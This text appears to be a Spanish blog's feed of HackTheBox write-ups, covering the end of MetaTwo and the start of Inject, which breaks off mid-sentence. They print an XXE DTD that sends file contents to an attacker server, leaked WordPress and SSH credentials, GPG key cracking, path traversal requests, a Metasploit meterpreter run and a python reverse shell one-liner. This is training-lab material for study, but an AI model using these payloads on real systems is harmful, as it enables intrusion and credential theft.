kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo=' | base64 -d;echoroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:109::/nonexistent:/usr/sbin/nologinsshd:x:104:65534::/run/sshd:/usr/sbin/nologinjnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bashsystemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologinsystemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologinmysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/falseproftpd:x:106:65534::/run/proftpd:/usr/sbin/nologinftp:x:107:65534::/srv/ftp:/usr/sbin/nologinCOmo vimos que usaba NGINX podemos atentar contra la ruta /etc/nginx/sites-enabled/default y ver mas informacion acerca del sitio.❯ cat exploit.dtd&lt;!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/nginx/sites-enabled/default\"&gt;&lt;!ENTITY % init \"&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.14.36/?p=%file;'&gt;\" &gt;WAVFootHoldWuolah vemos cosas interesantes.server {\tlisten 80;\tlisten [::]:80;\troot /var/www/metapress.htb/blog;\tindex index.php index.html;        if ($http_host != \"metapress.htb\") {                rewrite ^ http://metapress.htb/;        }\tlocation / {\t\ttry_files $uri $uri/ /index.php?$args;\t}    \tlocation ~ \\.php$ {\t\tinclude snippets/fastcgi-php.conf;\t\tfastcgi_pass unix:/var/run/php/php8.0-fpm.sock;\t}\tlocation ~* \\.(js|css|png|jpg|jpeg|gif|ico|svg)$ {\t\texpires max;\t\tlog_not_found off;\t}}Nos conectamos por SSH al usuarioSi vemos la ruta del proyecto ahí se encuentra un archivo importante wp-config.php como no podemos apuntar a el ya que el propietario es root podemos aplicar un recorrido de directorios ../wp-config.php.❯ php -S 0.0.0.0:80[Wed Mar 29 14:46:22 2023] PHP 7.4.33 Development Server (http://0.0.0.0:80) started[Wed Mar 29 14:46:32 2023] 10.10.11.186:49504 Accepted[Wed Mar 29 14:46:32 2023] 10.10.11.186:49504 [200]: (null) /exploit.dtd[Wed Mar 29 14:46:32 2023] 10.10.11.186:49504 Closing[Wed Mar 29 14:46:32 2023] 10.10.11.186:49512 Accepted[Wed Mar 29 14:46:32 2023] 10.10.11.186:49512 [404]: (null) /?p=PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg== - No such file or directorySi le aplicamos un decode a esto vemos&lt;?php/** The name of the database for WordPress */define( 'DB_NAME', 'blog' );/** MySQL database username */define( 'DB_USER', 'blog' );/** MySQL database password */define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );/** MySQL hostname */define( 'DB_HOST', 'localhost' );/** Database Charset to use in creating database tables. */define( 'DB_CHARSET', 'utf8mb4' );/** The Database Collate type. Don't change this if in doubt. */define( 'DB_COLLATE', '' );define( 'FS_METHOD', 'ftpext' );define( 'FTP_USER', 'metapress.htb' );define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );define( 'FTP_HOST', 'ftp.metapress.htb' );define( 'FTP_BASE', 'blog/' );define( 'FTP_SSL', false );/**#@+ * Authentication Unique Keys and Salts. * @since 2.6.0 */define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n&gt;+3m?.B/:' );define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );define( 'LOGGED_IN_KEY',    'J+mxCaP4z&lt;g.6P^t`ziv&gt;dd}EEi%48%JnRq^2MjFiitn#&amp;n+HXv]||E+F~C{qKXy' );define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*&lt;~:0]s}d&lt;&amp;M;.,x0z~R&gt;3!D' );define( 'SECURE_AUTH_SALT', '&gt;`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&amp;~omiH^jVC?2-I?I.' );define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&amp;^JsI`M)FJTJEVI) N#NOidIf=' );define( 'NONCE_SALT',       '.sU&amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );/** * WordPress Database Table prefix. */$table_prefix = 'wp_';/** * For developers: WordPress debugging mode. * @link https://wordpress.org/support/article/debugging-in-wordpress/ */define( 'WP_DEBUG', false );/** Absolute path to the WordPress directory. */if ( ! defined( 'ABSPATH' ) ) {\tdefine( 'ABSPATH', __DIR__ . '/' );}/** Sets up WordPress vars and included files. */require_once ABSPATH . 'wp-settings.php';Si se acuerdan en el escaneo NMAP  vimmos el puerto 21 (FTP), podemos autenticarnos.❯ ftp 10.10.11.186Connected to 10.10.11.186.220 ProFTPD Server (Debian) [::ffff:10.10.11.186]Name (10.10.11.186:h4ckerlite): metapress.htb331 Password required for metapress.htbPassword: 9NYS_ii@FyL_p5M2NvJ230 User metapress.htb logged inRemote system type is UNIX.Using binary mode to transfer files.ftp&gt; dir200 PORT command successful150 Opening ASCII mode data connection for file listdrwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blogdrwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer226 Transfer completeftp&gt; cd mailer250 CWD command successfulftp&gt; ls200 PORT command successful150 Opening ASCII mode data connection for file listdrwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php226 Transfer completeftp&gt; get send_email.phplocal: send_email.php remote: send_email.php200 PORT command successful150 Opening BINARY mode data connection for send_email.php (1126 bytes)226 Transfer complete1126 bytes received in 0.00 secs (911.0269 kB/s)ftp&gt; Leemos el archivo.❯ cat send_email.php&lt;?php/* * This script will be used to send an email to all our users when ready for launch*/use PHPMailer\\PHPMailer\\PHPMailer;use PHPMailer\\PHPMailer\\SMTP;use PHPMailer\\PHPMailer\\Exception;require 'PHPMailer/src/Exception.php';require 'PHPMailer/src/PHPMailer.php';require 'PHPMailer/src/SMTP.php';$mail = new PHPMailer(true);$mail-&gt;SMTPDebug = 3;                               $mail-&gt;isSMTP();            $mail-&gt;Host = \"mail.metapress.htb\";$mail-&gt;SMTPAuth = true;                          $mail-&gt;Username = \"jnelson@metapress.htb\";                 $mail-&gt;Password = \"Cb4_JmWM8zUZWMu@Ys\";                           $mail-&gt;SMTPSecure = \"tls\";                           $mail-&gt;Port = 587;                                   $mail-&gt;From = \"jnelson@metapress.htb\";$mail-&gt;FromName = \"James Nelson\";$mail-&gt;addAddress(\"info@metapress.htb\");$mail-&gt;isHTML(true);$mail-&gt;Subject = \"Startup\";$mail-&gt;Body = \"&lt;i&gt;We just started our new blog metapress.htb!&lt;/i&gt;\";try {    $mail-&gt;send();    echo \"Message has been sent successfully\";} catch (Exception $e) {    echo \"Mailer Error: \" . $mail-&gt;ErrorInfo;}Vemos un usuario y su contraseña, procedemos a conectarnos por SSH.❯ ssh jnelson@metapress.htbThe authenticity of host 'metapress.htb (10.10.11.186)' can't be established.ECDSA key fingerprint is SHA256:3MyoxrDpzSN/H4ZJAbl3k/OSAyorwqmMnL3UtS0pVcQ.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added 'metapress.htb,10.10.11.186' (ECDSA) to the list of known hosts.jnelson@metapress.htb's password: Cb4_JmWM8zUZWMu@YsLinux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Wed Mar 29 18:40:26 2023 from 10.10.16.29jnelson@meta2:~$ export TERM=xtermProcedemos a leer la flag.jnelson@meta2:~$ cat user.txt 1f****************************2djnelson@meta2:~$ Escalada de PrivilegiosSi vemos carpetas ocultas encontramos esto.jnelson@meta2:~$ ls -latotal 52drwxr-xr-x 6 jnelson jnelson 4096 Mar 29 16:25 .drwxr-xr-x 3 root    root    4096 Oct  5 15:12 ..lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -&gt; /dev/null-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrcdrwx------ 2 jnelson jnelson 4096 Mar 29 14:22 .gnupg-r-xr-x--- 1 jnelson jnelson 5243 Mar 29 16:25 .keysdrwxr-xr-x 3 jnelson jnelson 4096 Oct 25 12:51 .localdr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .passpie-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profiledrwx------ 2 jnelson jnelson 4096 Mar 29 16:25 .ssh-rw-r--r-- 1 jnelson jnelson    0 Mar 29 16:25 gpg.john-rw-r--r-- 1 jnelson jnelson  347 Mar 29 16:38 pass-rw-r----- 1 root    jnelson   33 Mar 29 13:39 user.txtjnelson@meta2:~$ La carpeta .passpie nos llama la atenciónjnelson@meta2:~/.passpie$ ls -latotal 24dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .drwxr-xr-x 6 jnelson jnelson 4096 Mar 29 16:25 ..-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keysdr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 sshA su vez, vemos un archivo .keysjnelson@meta2:~/.passpie$ ls  -latotal 24dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .drwxr-xr-x 6 jnelson jnelson 4096 Mar 29 16:25 ..-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keysdr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 sshjnelson@meta2:~/.passpie$ Copiamos la clave privada. En nuestra máquina ejecutamos❯ gpg2john key &gt; hashFile keyAhora lo intentamos crackear con john.❯ john -w:/usr/share/wordlists/rockyou.txt hashUsing default input encoding: UTF-8Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])Cost 1 (s2k-count) is 65011712 for all loaded hashesCost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashesCost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusblink182         (Passpie)1g 0:00:00:05 DONE (2023-03-29 15:43) 0.1934g/s 31.72p/s 31.72c/s 31.72C/s ginger..blink182Use the \"--show\" option to display all of the cracked passwords reliablySession completedCopiamos la data del archivo hash y la exportamos con passpie.jnelson@meta2:~$ lspass  user.txtjnelson@meta2:~$ passpie export pass Passphrase: jnelson@meta2:~$ Ahora leemos la información.jnelson@meta2:~$ cat passcredentials:- comment: ''  fullname: root@ssh  login: root  modified: 2022-06-26 08:58:15.621572  name: ssh  password: !!python/unicode '****************'- comment: ''  fullname: jnelson@ssh  login: jnelson  modified: 2022-06-26 08:58:15.514422  name: ssh  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'handler: passpieversion: 1.0jnelson@meta2:~$ Ahora solo queda hacer un un su rootjnelson@meta2:~$ su rootPassword: root@meta2:/home/jnelson# cat /root/root.txt49****************************a0root@meta2:/home/jnelson#"
  },
  
  {
    "title": "Encoding WriteUp",
    "url": "/posts/encoding-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "",
    "date": "2023-03-19 17:00:00 +0100",
    





    "snippet": "Proximamente…"
  },
  
  {
    "title": "Inject WriteUp",
    "url": "/posts/inject-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, easy, directory transversal, Ansible playbook, spring, SpEL injection, command injection",
    "date": "2023-03-11 17:00:00 +0100",
    





    "snippet": "Les explicaré cómo compremeter la máquina Inject de HackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de tipo Directory Transversal, usando dicha vulnerabilidad veremos una version vulnerable de Spring que cuenta con una vulnerabilidad de tipo command injection. Para migrar de usuario nos aprovecharemos de una contraseña filtrada. Y para escalar nuestros privilegios usaremos un archivo Ansibe playbook.Identificando el OSEnviando trazas ICMP (Internet Control Message Protocol) y usando el TTL(Time to Live) podemos identificar el OS.❯ ping -c1 10.129.178.241PING 10.129.178.241 (10.129.178.241) 56(84) bytes of data.64 bytes from 10.129.178.241: icmp_seq=1 ttl=63 time=214 ms--- 10.129.178.241 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 214.029/214.029/214.029/0.000 msVemos lo siguiente:  TTL          El TTL es 63, esto indica que es una máquina Linux, ya que dichas mæquinas cuentan con un TTL igual a 64, pero…..porqué aparece como 63 e infiero que es Linux. bueno nuestra conexión no es directa, pasa por un nodo intermedario y eso hace que el TTL disminuya en una unidad.      Analizando la WEBWeb ErrorSi entramos veremos un mensaje de que no se puede acceder, así que sabemos que el puerto HTTP está corriendo en otro puerto, realizamos un escaneo NMAP.Escaneo NMAPrealizaremos el escaneo para saber que purtos están abierto y además para ver por donde corre el HTTP.❯ nmap 10.129.178.241Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 12:33 -04Nmap scan report for 10.129.178.241Host is up (0.23s latency).Not shown: 998 closed tcp ports (reset)PORT     STATE SERVICE22/tcp   open  ssh8080/tcp open  http-proxyNmap done: 1 IP address (1 host up) scanned in 2.47 secondsCorre por el puerto 8080, ahora podemos ver la web correctamente.Web ErrorDetectando posibles métodos de intruciónVemos un Login, lo cual podemos crear una cuanta y probar cosas pero no existe dicho archiv, y vemos un Sing Up existe, podemos probar injeciones SQL y NoSQL pero nos redirige a una página que nos induca que esta en construcción.Enumerando DirectoriosUsando WFUZZ veremos algunos directorios importantes❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.178.241:8080/FUZZ 2&gt;/dev/null********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://10.129.178.241:8080/FUZZTotal requests: 220547=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                                =====================================================================000000153:   200        112 L    326 W      5371 Ch     \"blogs\"                                                                                                                000000051:   200        103 L    194 W      5654 Ch     \"register\"                                                                                                             000000352:   200        53 L     107 W      1857 Ch     \"upload\"                                                                                                               000001097:   500        0 L      27 W       712 Ch      \"environment\"                                                                                                          000002694:   500        0 L      3 W        106 Ch      \"error\"                                                                                                                000008675:   200        33 L     77 W       1086 Ch     \"release_notes\"                                                                                                        000022957:   400        0 L      32 W       431 Ch      \"http%3A%2F%2Fwww\"                                                                                                     000045226:   200        165 L    487 W      6657 Ch     \"http://10.129.178.241:8080/\"                                                                                          ^CTotal time: 267.0736Processed Requests: 48259Filtered Requests: 48251Requests/sec.: 180.6954La carpera /upload nos llama la atención, ingresamos a ella y podemos ver que nos dejan subir archivosUploadSi suvimos una reverse shell de PHP nos dice que solo adminte imagenes, subimos una imagen random y meremos resultados.Imagenentramos a ver la imagen y …..mmmm  img?= eso huele a Directory Transversal.Podemos probar ver el /etc/passwd ingresamos la cadenaDirectory Transversal../../../../../../../../../../../../../../../../etc/passwdPero no vemos nada, podemos probar con burp o curl, interceptamos la petición y la mandamos al repeater.BurpsuiteAnalizando mas a fondo la web  podemos intentar listar la carppeta donde se guardan las paginas web /var/www/❯ curl 'http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/'htmlWebAppla careta WebApp nos llama la atención podemos listar su contenido❯ curl 'http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/WebApp'.classpath.DS_Store.idea.project.settingsHELP.mdmvnwmvnw.cmdpom.xmlsrctargetUn archivo .xml, lo leemos.❯ curl 'http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/WebApp/pom.xml'&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\txsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt;\t&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\t&lt;parent&gt;\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;\t\t&lt;version&gt;2.6.5&lt;/version&gt;\t\t&lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;\t&lt;/parent&gt;\t&lt;groupId&gt;com.example&lt;/groupId&gt;\t&lt;artifactId&gt;WebApp&lt;/artifactId&gt;\t&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;\t&lt;name&gt;WebApp&lt;/name&gt;\t&lt;description&gt;Demo project for Spring Boot&lt;/description&gt;\t&lt;properties&gt;\t\t&lt;java.version&gt;11&lt;/java.version&gt;\t&lt;/properties&gt;\t&lt;dependencies&gt;\t\t&lt;dependency&gt;  \t\t\t&lt;groupId&gt;com.sun.activation&lt;/groupId&gt;  \t\t\t&lt;artifactId&gt;javax.activation&lt;/artifactId&gt;  \t\t\t&lt;version&gt;1.2.0&lt;/version&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;\t\t\t&lt;scope&gt;runtime&lt;/scope&gt;\t\t\t&lt;optional&gt;true&lt;/optional&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt;\t\t\t&lt;version&gt;3.2.2&lt;/version&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;\t\t\t&lt;scope&gt;test&lt;/scope&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.webjars&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;bootstrap&lt;/artifactId&gt;\t\t\t&lt;version&gt;5.1.3&lt;/version&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.webjars&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;webjars-locator-core&lt;/artifactId&gt;\t\t&lt;/dependency&gt;\t&lt;/dependencies&gt;\t&lt;build&gt;\t\t&lt;plugins&gt;\t\t\t&lt;plugin&gt;\t\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t\t&lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;\t\t\t\t&lt;version&gt;${parent.version}&lt;/version&gt;\t\t\t&lt;/plugin&gt;\t\t&lt;/plugin&gt;\t\t&lt;finalName&gt;spring-webapp&lt;/finalName&gt;\t&lt;/build&gt;&lt;/project&gt;Viendo algunas versiones nos encontranos con Spring Cloud Function Web, buscando CVE nos encontramos que es vulnerable a SpEL injection.ExplotaciónExplotación manualMuy pronto, les explicaré cómo resolver de forma manual. Se paciente.Explotación con MetaSploitNos abrimos metasploitmsfconsoleUsando de apoyo este foro nos guiaremos. Una vez dentro de metasploit  haremos lo siguiente.[msf](Jobs:0 Agents:0) &gt;&gt; use exploit/multi/http/spring_cloud_function_spel_injection[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; set RHOST 10.129.178.241RHOST =&gt; 10.129.178.241[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; set LHOST 10.10.14.170LHOST =&gt; 10.10.14.170[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; run[*] Started reverse TCP handler on 10.10.14.170:4444 [*] Running automatic check (\"set AutoCheck false\" to disable)[!] The service is running, but could not be validated.[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp[*] Command Stager progress - 100.00% done (823/823 bytes)[*] Sending stage (3045348 bytes) to 10.129.178.241[*] Meterpreter session 1 opened (10.10.14.170:4444 -&gt; 10.129.178.241:43644) at 2023-03-12 21:25:11 -0400(Meterpreter 1)(/) &gt; shellProcess 76003 created.Channel 1 created.whoami &amp;&amp; idfrankuid=1000(frank) gid=1000(frank) groups=1000(frank)Ahora para mayor comodidad nos pasaremos esa shell mediante reverse shell, comprobamos si esta python3 y efectivamente esta instalado.export RHOST=\"10.10.14.170\";export RPORT=443;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'En nuestra máquina nos ponemos en escucha por el puerto 443 y nos 